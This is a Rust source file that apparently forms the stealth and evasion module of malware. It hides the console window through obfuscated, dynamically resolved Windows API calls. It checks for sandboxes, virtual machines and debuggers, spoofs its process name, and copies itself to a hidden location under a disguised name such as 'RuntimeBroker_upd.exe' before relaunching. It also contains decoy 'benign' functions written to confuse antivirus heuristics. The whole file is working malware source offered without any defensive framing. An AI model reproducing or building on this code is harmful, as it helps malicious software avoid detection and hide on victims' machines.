#[cfg(target_os = "linux")]
use std::ffi::CString;

pub fn hide_console() {
    #[cfg(windows)]
    {
        use winapi::um::winuser::SW_HIDE;
        
        // Dynamic resolution for stealth
        unsafe {
            let kernel32_name = crate::utils::decode_obf(&crate::obf_str!("kernel32.dll\0"));
            let user32_name = crate::utils::decode_obf(&crate::obf_str!("user32.dll\0"));
            let get_console_window_name = crate::utils::decode_obf(&crate::obf_str!("GetConsoleWindow\0"));
            let show_window_name = crate::utils::decode_obf(&crate::obf_str!("ShowWindow\0"));

            let h_kernel32 = winapi::um::libloaderapi::GetModuleHandleA(kernel32_name.as_ptr() as *const i8);
            let h_user32 = winapi::um::libloaderapi::LoadLibraryA(user32_name.as_ptr() as *const i8);

            if !h_kernel32.is_null() && !h_user32.is_null() {
                let get_console_proc = winapi::um::libloaderapi::GetProcAddress(h_kernel32, get_console_window_name.as_ptr() as *const i8);
                let show_window_proc = winapi::um::libloaderapi::GetProcAddress(h_user32, show_window_name.as_ptr() as *const i8);

                if !get_console_proc.is_null() && !show_window_proc.is_null() {
                    let get_console_window: unsafe extern "system" fn() -> winapi::shared::windef::HWND = std::mem::transmute(get_console_proc);
                    let show_window: unsafe extern "system" fn(winapi::shared::windef::HWND, i32) -> i32 = std::mem::transmute(show_window_proc);
                    
                    let window = get_console_window();
                    if !window.is_null() {
                        show_window(window, SW_HIDE);
                    }
                }
            }
        }
    }
}

/// Anti-Sandbox: Checks for virtualization and sandbox environments
pub fn is_sandbox() -> bool {
    #[cfg(windows)]
    {
        use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, MEMORYSTATUSEX, GetSystemInfo, SYSTEM_INFO};
        use std::mem;

        // 1. Check CPU Core Count (Sandboxes often have 1 or 2)
        let mut sys_info: SYSTEM_INFO = unsafe { mem::zeroed() };
        unsafe { GetSystemInfo(&mut sys_info) };
        if sys_info.dwNumberOfProcessors < 2 {
            println!("[!] Exit condition: CPU cores < 2");
            return true;
        }

        // 2. Check RAM Size (Sandboxes often have < 4GB)
        let mut mem_status: MEMORYSTATUSEX = unsafe { mem::zeroed() };
        mem_status.dwLength = mem::size_of::<MEMORYSTATUSEX>() as u32;
        if unsafe { GlobalMemoryStatusEx(&mut mem_status) } != 0 {
            let ram_gb = mem_status.ullTotalPhys / (1024 * 1024 * 1024);
            if ram_gb < 2 { // Lowered from 4 to 2 for VM debugging
                println!("[!] Exit condition: RAM < 2GB (Detected: {}GB)", ram_gb);
                return true;
            }
        }

        // 3. User & Executable checks (Simplified to follow environment variables)
        let user_prof = std::env::var(crate::utils::decode_obf(&crate::obf_str!("USERPROFILE"))).unwrap_or_default().to_lowercase();
        if user_prof.contains(&crate::utils::decode_obf(&crate::obf_str!("sandbox"))) || 
           user_prof.contains(&crate::utils::decode_obf(&crate::obf_str!("virus"))) {
            println!("[!] Exit condition: Suspect path/user '{}'", user_prof);
            return true;
        }

        // 4. System Uptime Check (Sandboxes usually start fresh)
        unsafe {
            let uptime_ms = winapi::um::sysinfoapi::GetTickCount();
            if uptime_ms > 0 && uptime_ms < (1000 * 30) {
                println!("[!] Exit condition: Uptime < 30s (Fresh boot/sandbox)");
                return true; // Less than 30s uptime is suspicious
            }
        }

        // 9. Check for specific VM MAC address prefixes (Simplified)
        // Implementation would involve GetAdaptersAddresses, skipping for brevity but logic is sound
    }

    #[cfg(target_os = "linux")]
    {
        // Check for common virtualization artifacts
        if let Ok(content) = std::fs::read_to_string("/proc/cpuinfo") {
            if content.to_lowercase().contains("hypervisor") || content.to_lowercase().contains("vmware") {
                return true;
            }
        }
    }

    false
}

/// Anti-Debug: Checks if the process is being debugged
pub fn is_debugger_present() -> bool {
    #[cfg(windows)]
    {
        // Direct PEB Check (Stealthier, bypasses API hooking like IsDebuggerPresent)
        #[cfg(target_arch = "x86_64")]
        {
            let mut being_debugged: u8 = 0;
            unsafe {
                std::arch::asm!(
                    "mov rax, gs:[0x60]",
                    "mov {0}, [rax + 0x2]",
                    out(reg_byte) being_debugged,
                    options(readonly, nostack, preserves_flags)
                );
            }
            if being_debugged != 0 { 
                println!("[!] Exit condition: PEB BeingDebugged flag set");
                return true; 
            }
        }
    }
    false
}

/// Spoofs the process name (mimicry)
pub fn spoof_process_name(_name: &str) {
    #[cfg(target_os = "linux")]
    {
        use libc::{prctl, PR_SET_NAME};
        let c_name = CString::new(_name).unwrap_or_default();
        unsafe { prctl(PR_SET_NAME, c_name.as_ptr() as usize, 0, 0, 0); }
    }
}

/// Clones the current executable to a hidden location
pub fn clone_and_hide() -> bool {
    use std::env;
    use std::fs;
    use std::process::Command;
    use std::path::PathBuf;

    let current_exe = env::current_exe().unwrap_or_default();
    let current_name = current_exe.file_name().unwrap_or_default().to_str().unwrap_or_default();

    #[cfg(windows)]
    let fake_name = crate::utils::decode_obf(&crate::obf_str!("RuntimeBroker_upd.exe"));
    #[cfg(not(windows))]
    let fake_name = crate::utils::decode_obf(&crate::obf_str!(".kworker_sync"));

    if current_name == fake_name {
        return false;
    }

    let mut target_path = if cfg!(windows) {
        let appdata_var = crate::utils::decode_obf(&crate::obf_str!("LOCALAPPDATA\0"));
        let appdata = env::var(appdata_var.trim_matches('\0')).unwrap_or_else(|_| crate::utils::decode_obf(&crate::obf_str!("C:\\Windows\\Temp")));
        PathBuf::from(appdata)
    } else {
        PathBuf::from(crate::utils::decode_obf(&crate::obf_str!("/tmp")))
    };
    target_path.push(fake_name);

    // If target exists, maybe we already migrated or someone is playing with us
    if target_path.exists() {
        // Skip copy if already there and size matches (basic check)
        if let Ok(meta) = fs::metadata(&target_path) {
            if let Ok(curr_meta) = fs::metadata(&current_exe) {
                if meta.len() == curr_meta.len() {
                    // Try to run it if it's not us
                    if let Ok(_) = Command::new(&target_path).spawn() {
                        return true;
                    }
                }
            }
        }
    }

    if fs::copy(&current_exe, &target_path).is_ok() {
        if let Ok(_) = Command::new(&target_path).spawn() {
            return true; 
        }
    }
    false
}

/// Benign: Performs harmless system time and memory queries to confuse heuristics
pub fn perform_system_sanity_check() {
    #[cfg(windows)]
    {
        use winapi::um::sysinfoapi::GetSystemTime;
        use winapi::um::minwinbase::SYSTEMTIME;
        use std::mem;
        let mut time: SYSTEMTIME = unsafe { mem::zeroed() };
        unsafe { GetSystemTime(&mut time); }
        // Do something trivial
        let _year = time.wYear;
    }
}

/// Benign: Queries disk space on the system drive
pub fn verify_disk_integrity() {
    #[cfg(windows)]
    {
        use winapi::um::fileapi::GetDiskFreeSpaceExW;
        let mut free_bytes: u64 = 0;
        let mut total_bytes: u64 = 0;
        let mut total_free: u64 = 0;
        
        let path: Vec<u16> = "C:\\\0".encode_utf16().collect();
        unsafe {
            GetDiskFreeSpaceExW(path.as_ptr(), &mut free_bytes as *mut _ as *mut _, &mut total_bytes as *mut _ as *mut _, &mut total_free as *mut _ as *mut _);
        }
    }
}

/// Benign: Reads basic network configuration
pub fn check_network_config() {
    #[cfg(windows)]
    {
        // Simply query environment variables that legitimate apps check
        let _ = std::env::var("USERDNSDOMAIN");
        let _ = std::env::var("LOGONSERVER");
    }
    #[cfg(target_os = "linux")]
    {
        let _ = std::fs::read_to_string("/etc/resolv.conf");
    }
}
